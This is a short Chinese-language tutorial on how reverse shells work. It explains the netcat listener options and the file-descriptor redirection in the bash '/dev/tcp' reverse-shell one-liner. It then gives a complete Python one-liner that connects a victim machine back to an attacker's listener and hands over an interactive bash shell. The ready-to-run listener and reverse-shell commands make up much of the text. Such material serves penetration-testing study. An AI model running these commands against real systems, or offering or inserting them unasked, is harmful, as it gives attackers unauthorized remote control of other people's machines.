反弹shell的本质

 反弹shell（reverse shell），就是 攻击端 监听某TCP/UDP端口，客户端（被攻击端）发起请求到该端口，并将其命令行的输入输出转到攻击端 ！

解析上面的命令

  1. bash ： bash就是/bin/目录下的二进制程序，是linux 的一个比较常见的shell,其实linux的shell还有很多，比如 sh、zsh、等，他们之间有着细小差别。
  2. nc ：全名叫netcat，它可以在两台电脑之间建立连接，并返回两个数据流。
    • -l 使用监听模式，管控传入的资料。
    • -v 显示指令执行的过程
    • -p 通信端口 设置本地主机使用的通信端口
  3. Linux 文件描述符 ：Linux shell 下有三种标准文件描述符，
    • 0 （stdin）代表标准输入，使用 < 或 <<
    • 1 （stdout）代表标准输出，使用 > 或 <<
    • 2（stderr）代表标准错误输出，使用 2> 或 2>>
  4. 解释 ：bash -i >& /dev/tcp/ip/port 0>&1
    • bash -i 创造一个交互式的shell
    • >& 当它后面接文件时，表示标准输出和标准错误输出（混合输出）重定向到文件。
    • /dev/tcp/ip/port Linux 中一个特殊的设备，打开这个文件，相当于给对应的ip：port 发出一个 socket 调用，建立一个 socket 连接。
    • 0>&1 代表标准输入重定向到标准输出，这里标准输出已经定向到了/dev/tcp/ip/port 这个文件，也就是说标准输入定向到远程。

使用python反弹 shell

  1. 攻击机 使用 nc -lvp 6666 来进行监听次端口。
  2. 客户机上 使用以下命令即可：
    python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
